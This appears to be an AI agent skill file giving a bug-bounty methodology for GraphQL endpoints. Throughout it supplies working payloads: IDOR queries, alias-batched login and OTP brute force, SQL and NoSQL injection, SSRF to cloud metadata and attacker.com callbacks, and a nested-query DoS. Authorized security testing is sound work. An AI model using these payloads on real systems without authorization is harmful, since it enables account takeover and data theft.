---
name: hunt-graphql
description: Hunt GraphQL security vulnerabilities — introspection-driven IDOR discovery, batching/aliasing for rate-limit bypass and credential stuffing, field-level authorization flaws (vertical and horizontal), SQL/NoSQL injection via arguments, SSRF through URL-fetching resolvers, subscription hijacking, schema stitching trust boundary confusion, and deeply nested query DoS. Use when the target exposes a GraphQL endpoint at /graphql, /api/graphql, or /v1/graphql. High payout when authorization gaps expose cross-tenant data. Keywords: graphql, query, mutation, subscription, resolver, introspection, schema, fragment, alias, batching.
sources: hackerone_public, github_security_lab
report_count: 27
---

# HUNT-GRAPHQL — Authorization Flaws, Injection & Abuse

## Crown Jewel Targets

| Target type | Why high value | Payout range |
|---|---|---|
| SaaS apps with multi-tenant data | Resolver auth gaps → cross-org IDOR | $3k–$20k |
| Social/messaging platforms | Subscription hijacking, DM exfil | $2k–$15k |
| E-commerce / payments | Order/pricing field manipulation | $3k–$10k |
| Internal APIs exposed via federation | Schema stitching trust confusion | $5k–$25k |
| Auth platforms (mutations: createUser, resetPassword) | Account takeover via mutation abuse | $5k–$30k |

GraphQL authorization is resolver-level, not path-level — a single missed check on a nested field is a bug.

---

## Attack Surface Signals

**Endpoint patterns:**
```
/graphql
/api/graphql
/v1/graphql
/gql
/query
```

**Headers indicating GraphQL:**
```
Content-Type: application/json  (with body containing "query")
X-Apollo-Operation-Name:
Apollo-Require-Preflight:
```

**Request body shape:**
```json
{"query": "{ me { id email } }", "variables": {}}
{"query": "mutation { ... }", "operationName": "CreateUser"}
```

**JavaScript signals:**
```javascript
ApolloClient    // Apollo Client
urql            // urql
graphql-request
useQuery        // react-query/Apollo hooks
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover schema via introspection

```bash
# Full introspection query
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"}' \
  | jq . > schema.json

# If introspection is disabled, try field suggestions (typo probe)
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ usr { id } }"}' | grep -i "did you mean"
# Apollo returns "Did you mean 'user'?" — reveals field names
```

**Tools:**
```bash
# InQL — generates queries from schema
inql -t https://target.com/graphql --generate-queries
graphql-voyager  # visual schema explorer
clairvoyance     # introspection bypass via field suggestion
```

### Phase 2 — Map sensitive types and mutations

From the schema, identify:
- Types with `id` fields that could be used in IDOR attacks
- Mutations that modify data: `updateUser`, `deleteAccount`, `transferFunds`, `changePassword`
- Fields with `admin`, `internal`, `sensitive`, `private` in the name
- `viewer` vs `user` patterns (viewer = self, user = any — classic IDOR gap)

### Phase 3 — Authorization testing (IDOR on fields)

**Vertical privilege escalation** — access fields your role shouldn't see:
```graphql
query {
  user(id: "current_user_id") {
    id
    email
    role          # should this be visible to regular users?
    passwordHash  # definitely shouldn't
    internalNotes
    stripeCustomerId
  }
}
```

**Horizontal IDOR** — access another user's data:
```graphql
query {
  user(id: "victim_user_id_from_recon") {  # substitute another user's ID
    email
    phone
    orders { total items { productId } }
    paymentMethods { last4 brand }
  }
}
```

**Nested IDOR** — authorization on parent object doesn't mean child is protected:
```graphql
query {
  organization(id: "attacker_org_id") {
    members {
      id
      email
      privateProfile {   # resolver may not re-check org membership
        ssn
        salary
      }
    }
  }
}
```

### Phase 4 — Mutation authorization testing

Test mutations against objects you don't own:
```graphql
mutation {
  updateUser(id: "victim_id", email: "attacker@evil.com") {
    id
    email
  }
}

mutation {
  deletePost(id: "other_users_post_id") {
    success
  }
}

mutation {
  addAdminToOrg(orgId: "other_org", userId: "attacker_id") {
    role
  }
}
```

### Phase 5 — Batching and alias attacks

**Alias-based rate limit bypass** — multiple operations in one request:
```graphql
query {
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
  # ... up to 100+ aliases
}
```

**Array batching** (if endpoint accepts arrays):
```json
[
  {"query": "mutation { login(username:\"admin\", password:\"p1\") { token } }"},
  {"query": "mutation { login(username:\"admin\", password:\"p2\") { token } }"}
]
```

**OTP/2FA bypass via batching:**
```graphql
mutation {
  v1: verifyOtp(code: "000001") { token }
  v2: verifyOtp(code: "000002") { token }
  ...
}
```

### Phase 6 — Injection via arguments

**SQL injection:**
```graphql
query {
  users(filter: "' OR '1'='1") { id email }
  products(search: "' UNION SELECT username,password FROM users--") { name }
}
```

**NoSQL injection (MongoDB):**
```graphql
query {
  user(id: {"$gt": ""}) { email passwordHash }
}
```

**SSTI/template injection in search/filter args:**
```graphql
query {
  search(q: "{{7*7}}") { results }   # look for 49 in response
}
```

### Phase 7 — SSRF via URL-fetching resolvers

Fields that fetch external URLs:
```graphql
mutation {
  updateAvatar(url: "http://169.254.169.254/latest/meta-data/") { success }
  importFeed(feedUrl: "http://internal-service.local/admin") { items { title } }
  webhook(callbackUrl: "https://attacker.com") { id }
}
```

Test with Burp Collaborator or interactsh URL to confirm callbacks.

### Phase 8 — Subscription hijacking

WebSocket-based subscriptions may have weak authorization:
```graphql
subscription {
  messageAdded(channelId: "other_users_channel_id") {
    content
    sender { email }
  }
}

subscription {
  orderUpdated(orderId: "any_order_id") {
    status
    paymentInfo { cardLast4 }
  }
}
```

### Phase 9 — Query depth DoS

If no depth limit:
```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends {
            friends { id email }
          }
        }
      }
    }
  }
}
```

Demonstrates impact but confirm with team before sending — this can cause real DoS.

---

## Automation

```bash
# InQL Burp plugin — schema analysis and query generation
# https://github.com/doyensec/inql

# Clairvoyance — introspection bypass
python3 clairvoyance.py -u https://target.com/graphql -o schema.json

# graphql-cop — automated security audit
python3 graphql-cop.py -t https://target.com/graphql

# BatchQL — batching attack automation
python3 BatchQL.py -e https://target.com/graphql

# Detect GraphQL endpoints
katana -u https://target.com | grep -iE 'graphql|/gql'
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| IDOR on nested object | Sensitive data exfil (PII, payment) | High–Critical |
| Mutation IDOR | Account takeover, data modification | Critical |
| Batching + OTP | 2FA bypass → ATO | Critical |
| SSRF via avatar URL | Cloud metadata → credential theft | Critical |
| Subscription IDOR | Real-time private data stream | High |
| SQL injection in filter | Database dump | Critical |
| Introspection enabled | Schema leak → targeted attacks | Low (enabler) |

---

## Validation

✅ **Confirmed IDOR:** Query for another user's ID returns their private data

✅ **Confirmed mutation abuse:** Mutation on object you don't own succeeds (200, not 403)

✅ **Confirmed batching bypass:** 100 alias login attempts in one request, no rate limiting

✅ **Confirmed SSRF:** Collaborator callback from URL-fetching resolver

✅ **Confirmed injection:** Response contains SQL error or unexpected data from injected arg

### Severity assessment

| Scenario | CVSS | Typical payout |
|---|---|---|
| IDOR exposing all users' PII | High 8.1 | $3k–$10k |
| Mutation IDOR → account takeover | Critical 9.1 | $5k–$20k |
| SSRF via resolver → metadata | Critical 9.3 | $5k–$20k |
| Batching → 2FA bypass | Critical 9.0 | $5k–$15k |
| SQL injection via arg | Critical 9.8 | $10k–$40k |

### Related skills

Cross-reference: `hunt-idor` (for broader ID enumeration), `hunt-ssrf-cloud` (for SSRF chains), `hunt-llm-injection` (if GraphQL feeds an LLM).
